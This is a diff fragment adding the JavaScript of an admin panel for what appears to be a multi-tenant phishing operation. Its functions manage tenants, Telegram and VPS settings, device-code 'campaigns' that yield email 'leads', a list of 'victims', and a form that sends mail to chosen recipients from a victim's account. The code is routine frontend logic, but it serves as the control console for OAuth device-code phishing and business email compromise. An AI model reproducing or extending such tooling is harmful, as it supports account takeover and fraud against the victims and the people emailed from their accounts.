+            body: JSON.stringify({ role: document.getElementById('roleSelect').value })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                location.reload();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => alert('Error: ' + err));
+    }
+    function openExpiryModal(id) {
+        currentUserId = id;
+        document.getElementById('expiryDays').value = 30;
+        new bootstrap.Modal(document.getElementById('expiryModal')).show();
+    }
+    function saveExpiry() {
+        fetch('/admin/user/' + currentUserId + '/set_expiry', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ days: parseInt(document.getElementById('expiryDays').value) || 0 })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                location.reload();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => alert('Error: ' + err));
+    }
+    function openBalanceModal(id, balance) {
+        currentUserId = id;
+        document.getElementById('currentBalanceDisplay').textContent = '$' + balance.toFixed(2);
+        document.getElementById('balanceAmount').value = 10;
+        new bootstrap.Modal(document.getElementById('balanceModal')).show();
+    }
+    function balanceAction(action) {
+        const amount = parseFloat(document.getElementById('balanceAmount').value) || 0;
+        if (amount <= 0) { alert('Enter positive amount.'); return; }
+        fetch('/admin/user/' + currentUserId + '/balance', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ amount, action })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                alert('New balance: $' + data.new_balance.toFixed(2));
+                location.reload();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => alert('Error: ' + err));
+    }
+
+    // Tenant actions
+    function toggleTenant(id) {
+        if (!confirm('Toggle tenant?')) return;
+        fetch('/admin/tenant/' + id + '/toggle', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    function deleteTenant(id) {
+        if (!confirm('Delete tenant?')) return;
+        fetch('/admin/tenant/' + id + '/delete', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    let currentTenantId = null;
+    function openPlanModal(id, plan) {
+        currentTenantId = id;
+        document.getElementById('planSelect').value = plan;
+        new bootstrap.Modal(document.getElementById('planModal')).show();
+    }
+    function savePlan() {
+        fetch('/admin/tenant/' + currentTenantId + '/update_plan', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ plan: document.getElementById('planSelect').value })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                location.reload();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => alert('Error: ' + err));
+    }
+    function openTenantSettings(id, name) {
+        document.getElementById('tenantSettingsName').textContent = name;
+        document.getElementById('telegramTenantId').value = id;
+        document.getElementById('vpsTenantId').value = id;
+        document.getElementById('tenantTelegramForm').action = '/admin/tenant/' + id + '/telegram';
+        document.getElementById('tenantVpsForm').action = '/admin/tenant/' + id + '/vps';
+        new bootstrap.Modal(document.getElementById('tenantSettingsModal')).show();
+    }
+    document.getElementById('tenantTelegramForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const tenantId = document.getElementById('telegramTenantId').value;
+        const data = {
+            bot_token: document.getElementById('telegramBotToken').value,
+            chat_id: document.getElementById('telegramChatId').value
+        };
+        await fetch('/admin/tenant/' + tenantId + '/telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        alert('Telegram settings saved.');
+        bootstrap.Modal.getInstance(document.getElementById('tenantSettingsModal')).hide();
+    });
+    document.getElementById('tenantVpsForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const tenantId = document.getElementById('vpsTenantId').value;
+        const data = {
+            vps_ip: this.querySelector('[name="vps_ip"]').value,
+            vps_port: this.querySelector('[name="vps_port"]').value,
+            vps_username: this.querySelector('[name="vps_username"]').value,
+            vps_auth_method: this.querySelector('[name="vps_auth_method"]').value,
+            vps_credentials: this.querySelector('[name="vps_credentials"]').value
+        };
+        await fetch('/admin/tenant/' + tenantId + '/vps', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        alert('VPS settings saved.');
+        bootstrap.Modal.getInstance(document.getElementById('tenantSettingsModal')).hide();
+    });
+
+    // Campaign actions
+    function toggleCampaign(id) {
+        if (!confirm('Toggle campaign?')) return;
+        fetch('/admin/campaign/' + id + '/toggle', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    function deleteCampaign(id) {
+        if (!confirm('Delete campaign?')) return;
+        fetch('/admin/campaign/' + id + '/delete', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    function showDeviceCodes(id) {
+        fetch('/admin/campaign/' + id + '/device_codes')
+            .then(r => r.json())
+            .then(data => {
+                let msg = '📋 Device Codes:\n';
+                data.forEach(v => msg += `ID: ${v.id} | ${v.user_code} | ${v.status}\n`);
+                alert(msg);
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    function processCampaign(id) {
+        fetch('/admin/campaign/' + id + '/process')
+            .then(r => r.json())
+            .then(data => {
+                alert('Processed: ' + data.verified_leads + ' leads created.');
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    function getLeads(id) {
+        fetch('/admin/campaign/' + id + '/leads')
+            .then(r => r.json())
+            .then(data => {
+                let msg = '📧 Leads:\n';
+                data.forEach(l => msg += `${l.email} (${l.provider}) - verified: ${l.verified}\n`);
+                alert(msg || 'No leads.');
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+
+    // Victim actions
+    function deleteVictim(id) {
+        if (!confirm('Delete this victim?')) return;
+        fetch('/admin/victim/' + id + '/delete', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+
+    // B2B send
+    document.getElementById('b2bForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const payload = {
+            victim_id: document.getElementById('b2bVictim').value,
+            recipients: document.getElementById('b2bRecipients').value,
+            subject: document.getElementById('b2bSubject').value,
+            body: document.getElementById('b2bBody').value
+        };
+        document.getElementById('b2bResult').innerHTML = '<div class="alert alert-info">⏳ Sending...</div>';
+        fetch('/admin/b2b_send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('b2bResult').innerHTML = `<div class="alert alert-success">✅ Sent ${data.sent} of ${data.total}. Failed: ${data.failed.length}</div>`;
+        })
+        .catch(err => {
+            document.getElementById('b2bResult').innerHTML = `<div class="alert alert-danger">❌ ${err.message}</div>`;
+        });
+    });
+</script>
+
+</body>
+</html>
